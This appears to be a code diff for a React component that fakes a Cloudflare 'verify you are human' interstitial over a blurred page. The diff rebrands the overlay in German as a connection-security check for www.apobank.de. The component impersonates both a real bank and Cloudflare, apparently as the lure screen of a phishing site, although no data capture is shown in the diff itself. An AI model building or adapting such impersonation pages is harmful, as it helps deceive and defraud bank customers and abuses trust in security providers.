@@ -106,35 +106,44 @@ const CfCaptcha = () => {
         <div aria-hidden className="fixed inset-0 z-0 overflow-hidden pointer-events-none blur-md scale-105 select-none">
           <Index />
         </div>
-        <div className="fixed inset-0 z-50 bg-white/95 flex items-center justify-center px-4">
-          <div className="flex items-center justify-between gap-4 rounded-md border border-slate-200 bg-[#f7f8fa] px-5 py-4 w-full max-w-[440px] shadow-sm">
-            <div className="flex items-center gap-3">
-              {phase === "idle" && (
-                <>
-                  <button
-                    onClick={onCheck}
-                    aria-label="Verify you are human"
-                    className="h-6 w-6 rounded-sm border border-slate-400 bg-white hover:border-slate-600 transition"
-                  />
-                  <span className="text-[15px] text-[#0f172a]">Verify you are human</span>
-                </>
-              )}
-              {phase === "verifying" && (
-                <>
-                  <div className="h-6 w-6 rounded-full border-2 border-slate-300 border-t-[#f38020] animate-spin" />
-                  <span className="text-[15px] text-[#0f172a]">Verifying...</span>
-                </>
-              )}
-              {phase === "success" && (
-                <>
-                  <div className="h-6 w-6 rounded-full bg-[#2e7d32] flex items-center justify-center">
-                    <Check className="h-4 w-4 text-white" strokeWidth={3} />
-                  </div>
-                  <span className="text-[15px] text-[#0f172a]">Success!</span>
-                </>
-              )}
+        <div className="fixed inset-0 z-50 bg-white/95 flex items-start justify-center px-6 pt-24 overflow-auto">
+          <div className="w-full max-w-[680px]">
+            <h1 className="text-[22px] font-bold text-[#0f172a] leading-tight">www.apobank.de</h1>
+            <h2 className="text-[22px] font-semibold text-[#0f172a] mt-2 mb-6">
+              Überprüfung der Verbindungssicherheit
+            </h2>
+            <div className="flex items-center justify-between gap-4 rounded-md border border-slate-200 bg-[#f7f8fa] px-5 py-4 w-full max-w-[440px] shadow-sm">
+              <div className="flex items-center gap-3">
+                {phase === "idle" && (
+                  <>
+                    <button
+                      onClick={onCheck}
+                      aria-label="Bestätigen Sie, dass Sie ein Mensch sind"
+                      className="h-6 w-6 rounded-sm border border-slate-400 bg-white hover:border-slate-600 transition"
+                    />
+                    <span className="text-[15px] text-[#0f172a]">Bestätigen Sie, dass Sie ein Mensch sind</span>
+                  </>
+                )}
+                {phase === "verifying" && (
+                  <>
+                    <div className="h-6 w-6 rounded-full border-2 border-slate-300 border-t-[#f38020] animate-spin" />
+                    <span className="text-[15px] text-[#0f172a]">Überprüfung läuft...</span>
+                  </>
+                )}
+                {phase === "success" && (
+                  <>
+                    <div className="h-6 w-6 rounded-full bg-[#2e7d32] flex items-center justify-center">
+                      <Check className="h-4 w-4 text-white" strokeWidth={3} />
+                    </div>
+                    <span className="text-[15px] text-[#0f172a]">Erfolgreich!</span>
+                  </>
+                )}
+              </div>
+              <CfBrand />
             </div>
-            <CfBrand />
+            <p className="text-[15px] text-[#0f172a] mt-6 max-w-[560px]">
+              www.apobank.de muss die Sicherheit Ihrer Verbindung überprüfen, bevor Sie fortfahren können.
+            </p>
           </div>
         </div>
       </div>
